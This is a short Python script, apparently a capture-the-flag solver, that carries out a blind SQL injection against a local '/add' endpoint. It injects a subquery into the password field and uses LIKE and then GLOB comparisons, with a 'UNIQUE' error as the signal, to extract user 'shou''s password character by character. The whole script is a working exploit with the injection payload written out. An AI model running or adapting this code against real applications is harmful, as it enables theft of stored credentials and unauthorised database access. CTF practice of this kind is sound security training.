import requests, string, time

url = 'http://localhost:4008/add'
chars = string.printable
foundchars = ''
solvestr = 'we{'

for i in chars:
    send = {'username':'abc', 'password':f'a\',(SELECT password FROM user WHERE username = \"shou\" AND password LIKE \"%{i}%\")); --'}
    r = requests.post(url, data=send)
    if 'UNIQUE' in r.text: foundchars+=i
    time.sleep(0.1)
print(f'\n\n\n{(len(foundchars)+7)*"-"}\nFound: {foundchars}\n{(len(foundchars)+7)*"-"}\n\nTrying\t| Solved')

while solvestr[-1]!='}':
    for i in foundchars:
        send = {'username':'abc', 'password':f'a\',(SELECT password FROM user WHERE username = \"shou\" AND password GLOB \"{solvestr+i}*\"));--'}
        r = requests.post(url, data=send)
        if 'UNIQUE' in r.text: solvestr+=i
        print(f'{i}\t| {solvestr+i}', end='\r')
        time.sleep(0.1)
print(f'\n\nSolved: {solvestr}\n')
